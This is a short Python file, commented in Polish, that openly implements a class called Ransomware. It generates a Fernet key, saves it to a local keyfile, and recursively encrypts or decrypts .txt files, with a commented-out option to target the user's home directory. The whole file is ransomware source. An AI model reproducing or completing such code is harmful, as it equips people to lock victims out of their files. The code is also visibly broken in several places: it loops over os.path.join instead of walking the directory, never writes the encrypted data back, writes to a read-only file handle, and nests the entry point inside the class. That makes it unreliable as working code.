import os
from os.path import expanduser
from cryptography.fernet import Fernet


class Ransomware(object):
    def __init__(self):
        self.key = None  # klucz do szyfrowania plików
        self.cryptor = None  # objekt, który wykonuje funkcje szyfrowania
        self.file_ext_targets = ['txt']  # typ plików, który zamierzamy szyfrować

    def generate_key(self):
        # wygeneruje klucz początkowy, aby odblokować pliki i przekazać go do kryptera
        # weryfikacja wlasciwego klucza do odszyfrowania
        self.key = Fernet.generate_key()
        self.cryptor = Fernet(self.key)

    def read_key(self, keyfile_name):
        # czyta klucz do odszyfrowania
        with open(keyfile_name, "rb") as f:
            self.key = f.read()
            self.cryptor = Fernet(self.key)

    def write_key(self, keyfile_name):
        # zapisuje klucz do odszyfrowania pliku
        print(self.key)
        with open(keyfile_name, "wb") as f:
            f.write(self.key)

    def crypt_root(self, root_dir, encrypted=False):
        # rekursywnie szyfruje lub odszyfruje pliki z katalogu głownego
        for root, _, files in os.path.join(root_dir):
            for f in files:
                abs_file_path = os.path.join(root, f)
                # pass, jeśli w biezacym folderze nie ma zadnych plikow docelowych
                if not abs_file_path.split(".")[-1] in self.file_ext_targets:
                    continue
                self.crypt_file(abs_file_path, encrypted=encrypted)

    def crypt_file(self, file_path, encrypted=False):
        # funckja szyfrowania i odszyfrowywania
        with open(file_path, "rb") as f:
            _data = f.read()
            if not encrypted:
                # szyfrowanie
                print()
                print(f"File contents before encryption: {_data}")
                # zawartość pliku przed zaszyfrowaniem
                data = self.cryptor.encrypt(_data)
                print(f"File contents after encryption: {data}")
                # zawartość pliku po zaszyfrowaniu
            else:
                # odszyfrowanie
                data = self.cryptor.decrypt(_data)
                print(f"File content before encryption: {data}")
                f.seek(0)
                f.write(data)

    if __name__ == "__main__":
        # sys_root = expanduser("~")
        local_root = "."
        import argparse
        parser = argparse.ArgumentParser()
        parser.add_argument("--action", required=True)
        parser.add_argument("--keyfile")

        args = parser.parse_args()
        action = args.action.lower()
        keyfile = args.keyfile

        ransom = Ransomware()

        if action == "decrypt":
            if keyfile is None:
                print("Path to keyfile must be specitied after --keyfile for decryption")
                # ściażka do keyfile musi być podane po --keyfile do odszyfrowania
            else:
                ransom.read_key(keyfile)
                ransom.crypt_root(local_root, encrypted=True)
        elif action == "encrypt":
            ransom.generate_key()
            ransom.write_key("keyfile")
            ransom.crypt_root(local_root)
